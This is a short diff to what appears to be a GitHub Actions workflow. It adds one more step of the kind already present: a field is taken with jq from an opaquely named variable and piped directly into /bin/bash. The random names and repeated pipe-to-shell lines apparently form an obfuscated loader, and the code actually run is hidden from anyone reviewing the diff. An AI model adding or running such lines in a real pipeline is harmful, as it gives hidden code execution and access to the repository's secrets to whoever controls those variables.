@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$r6" | jq -r .ggmh18878 | /bin/bash
           printf '%s' "$wayb77" | jq -r .mjs23 | /bin/bash
           echo $beanc28 | jq -r .gi49 | /bin/bash
+          echo $rcx490 | jq -r .o08 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
